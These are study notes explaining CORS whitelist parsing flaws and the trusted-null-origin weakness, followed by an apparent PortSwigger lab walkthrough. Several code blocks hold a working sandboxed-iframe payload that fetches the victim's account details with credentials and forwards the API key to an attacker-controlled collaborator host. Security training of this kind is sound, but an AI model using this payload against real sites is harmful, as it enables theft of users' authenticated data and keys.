## Errors parsing Origin headers

   - Some applications that support access from multiple origins do so by using a whitelist of allowed origins.
   - When a CORS request is received, the supplied origin is compared to the whitelist. If the origin appears on the whitelist then it is reflected in the `Access-Control-Allow-Origin` header so that access is granted.

**For example, the application receives a normal request like:**
```js
GET /data HTTP/1.1 
Host: normal-website.com 
... 
Origin: https://innocent-website.com
```

**The application checks the supplied origin against its list of allowed origins and, if it is on the list, reflects the origin as follows:**
```js
HTTP/1.1 200 OK 
... 
Access-Control-Allow-Origin: https://innocent-website.com
```

   - Mistakes often arise when implementing CORS origin whitelists. Some organizations decide to allow access from all their subdomains (including future subdomains not yet in existence).
   - And some applications allow access from various other organizations' domains including their subdomains. These rules are often implemented by matching URL prefixes or suffixes, or using regular expressions.
   - Any mistakes in the implementation can lead to access being granted to unintended external domains.

**For example, suppose an application grants access to all domains ending in:**
```js
normal-website.com
```

**An attacker might be able to gain access by registering the domain:**
```js
hackersnormal-website.com
```

**Alternatively, suppose an application grants access to all domains beginning with**
```js
normal-website.com
```

**An attacker might be able to gain access using the domain:**
```js
normal-website.com.evil-user.net
```


## Whitelisted null origin value

**The specification for the Origin header supports the value `null`. Browsers might send the value `null` in the Origin header in various unusual situations:**
   - Cross-origin redirects.
   - Requests from serialized data.
   - Request using the `file:` protocol.
   - Sandboxed cross-origin requests.

**Some applications might whitelist the `null` origin to support local development of the application. For example, suppose an application receives the following cross-origin request:**
```js
GET /sensitive-victim-data 
Host: vulnerable-website.com 
Origin: null
```

**And the server responds with:**
```js
HTTP/1.1 200 OK 
Access-Control-Allow-Origin: null 
Access-Control-Allow-Credentials: true
```

In this situation, an attacker can use various tricks to generate a cross-origin request containing the value `null` in the Origin header.
This will satisfy the whitelist, leading to cross-domain access.
**For example, this can be done using a sandboxed `iframe` cross-origin request of the form:**
```js
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script> 
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','vulnerable-website.com/sensitive-victim-data',true); req.withCredentials = true; 
req.send(); 

function reqListener() { 
location='malicious-website.com/log?key='+this.responseText; 
}; 
</script>"></iframe>
```

#### Origin: null - 

   - The "Origin: null" header signifies that the request did not come from a different origin but rather from the local file system or a non-HTTP context.
   - This can happen when you are working with local files or running a web page from the "file://" protocol (e.g., when testing a web page from your local computer without a web server). In such cases, the browser sets the "Origin" to "null" to indicate that the request doesn't have an origin associated with an HTTP server.

## Steps to solve lab
### Title - CORS vulnerability with trusted null origin

**Desc** - This website has an insecure [CORS](https://portswigger.net/web-security/cors) configuration in that it trusts the "null" origin. To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

**Creds** - You can log in to your own account using the following credentials: `wiener:peter`


```js
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script> 
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://0a5500a00415b6d18412f41c000b0046.web-security-academy.net/accountDetails',true); req.withCredentials = true; 
req.send(); 

function reqListener() { 
location='https://b3f1uqesak0cmcxhntst7ess9jfa30rp.oastify.com/log?key='+this.responseText; 
}; 
</script>"></iframe>
```


1. Try to find any CORS related headers in the application.
![[cors20.png]]
We got a end-point("/accountDetails"), which is most likely vulnerable. Let's test for it.

2. To test for CORS misconfiguration:
	1. We try to change the value of origin header to an arbitrary value.
	  **Before adding the Origin header** - 
	  ![[cors17.png]]
	  
	  **After adding the Origin header** - 
	  ![[cors18.png]]
	  As you can see above, it doesn't reflect value of "Origin" header in the "Access-Control-Allow-Origin" it means, it doesn't accept arbitrary origin.
	  
	  2. Change the origin header to null value.
	  **Before adding the Origin header** - 
	  ![[cors17.png]]
	  
	  **After adding the Origin header to null** - 
	  ![[cors19.png]]
	  As you can see above, you can not only have access to public resources but also have access to private resources because of "Access-Control-allow-Credentials" header is set.

3. Copy the below payload and paste it into the exploit server.
```js
<iframe style="display: none" sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script> 
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://0a3100d50409b288803eccdf00ee003d.web-security-academy.net/accountDetails',true); req.withCredentials = true; 
req.send(); 

function reqListener() { 
location='https://xstnjc3ez6pybym3cfhfw0hey54wsngc.oastify.com/log?key='+this.responseText; 
}; 
</script>"></iframe>
```

![[cors21.png]]

We got a response in burp collaborator.
![[cors22.png]]

Decoding the api key.
![[cors23.png]]

submit the api key and the lab has been solved.
#### Payload Code explaination - 
`<iframe>`: This is an HTML element used to embed another web document within the current document.

`sandbox="allow-scripts allow-top-navigation allow-forms"`: The "sandbox" attribute is used to control the permissions and restrictions placed on the content displayed in the iframe. In this case, it allows scripts to run (`allow-scripts`), enables the iframe to navigate the top-level document (`allow-top-navigation`), and allows the use of forms (`allow-forms`).

`src="data:text/html,<script> ... </script>"`: The "src" attribute specifies the content that will be displayed within the iframe. In this case, the source is set to "data:text/html," followed by a `<script>` block containing JavaScript code. This code performs the following actions:
   - It sends an XMLHttpRequest (AJAX) request to the URL `https://0a5500a00415b6d18412f41c000b0046.web-security-academy.net/accountDetails`.
   - `req.withCredentials = true` indicates that the request should include credentials (e.g., cookies) when making the request.
   - When the request completes successfully, the `reqListener` function is executed. This function changes the location (URL) of the top-level document to a different URL (`https://b3f1uqesak0cmcxhntst7ess9jfa30rp.oastify.com/log?key=` followed by the response text).

The provided code seems to make a cross-origin request to `https://0a5500a00415b6d18412f41c000b0046.web-security-academy.net/accountDetails` and then redirects the top-level document to another URL with a query parameter (`key`) that contains the response text from the request.



For better understanding watch --> [[CORS_Lab_2_CORS vulnerability with trusted null origin _ Long Video.mp4]]

